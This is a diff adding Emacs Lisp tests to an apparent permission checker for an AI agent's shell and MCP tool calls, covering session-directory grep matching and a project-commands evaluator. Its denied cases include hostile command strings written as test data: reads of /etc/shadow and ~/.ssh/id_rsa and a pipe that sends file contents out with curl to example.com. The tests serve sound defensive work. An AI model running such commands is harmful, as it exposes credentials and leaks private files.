@@ -653,6 +653,21 @@ PATH defaults to `konix/agent-shell-tests--review'."
       "mcp__konix-files__grep" 'pattern "^def " 'path "/tmp/x.py")))
 
 (konix/agent-shell-tests-deftable
+    konix/agent-shell-test-own-session-greps-its-own-files
+    (lambda (path)
+      (cl-letf (((symbol-function 'konix/agent-shell--own-session-directory)
+                 (lambda () "/home/u/.claude/projects/p/s1/")))
+        (and (konix/agent-shell-tool-match-p
+              "@own-session"
+              (konix/agent-shell-tests--mcp-call
+               "mcp__konix-files__readonly_grep" 'pattern "x" 'path path))
+             t)))
+  (t . "/home/u/.claude/projects/p/s1/tool-results/r.txt")
+  (nil . "/home/u/.claude/projects/p/s2/tool-results/r.txt")
+  (t . "/home/u/.claude/projects/p/s1.jsonl")
+  (nil . "/home/u/.claude/projects/p/s2.jsonl"))
+
+(konix/agent-shell-tests-deftable
     konix/agent-shell-test-mcp-candidate-matches-its-call
     (lambda (call)
       (and (konix/agent-shell-tool-match-p
@@ -936,6 +951,27 @@ PATH defaults to `konix/agent-shell-tests--review'."
   (nil . "grep -n foo ~/.ssh/id_rsa")
   (nil . "grep -n foo ../other/secret")
   (nil . "grep -n foo $(ls)"))            ; unreadable, so it resolves nowhere
+
+(konix/agent-shell-tests-deftest-key
+    konix/agent-shell-test-inside-skips-options
+    (format "@inside(%s)" (expand-file-name "sub"))
+  (:setup (make-directory "sub"))
+  (t . "grep -o -E 'a\\.b' sub/x.txt")
+  (t . "grep --file=sub/patterns sub/x.txt")
+  (nil . "grep --file=/etc/shadow sub/x.txt") ; the value is a path
+  (nil . "grep -f /etc/shadow sub/x.txt")
+  (nil . "grep -o x.txt"))
+
+(konix/agent-shell-tests-deftest-evaluator
+    konix/agent-shell-test-project-commands "project-commands"
+  (t . "wc -l notes.txt")
+  (t . "ls")
+  (t . "sort notes.txt | head -3")
+  (t . "timeout 5 cat notes.txt")         ; the wrapper is looked through
+  (nil . "curl notes.txt")                ; not a listed command
+  (nil . "cat /etc/shadow")
+  (nil . "cat ~/.ssh/id_rsa")
+  (nil . "grep foo notes.txt | curl -d @- example.com"))
 
 (konix/agent-shell-tests-deftest-evaluator
     konix/agent-shell-test-gh-read-refuses-writing-filters "gh-read"
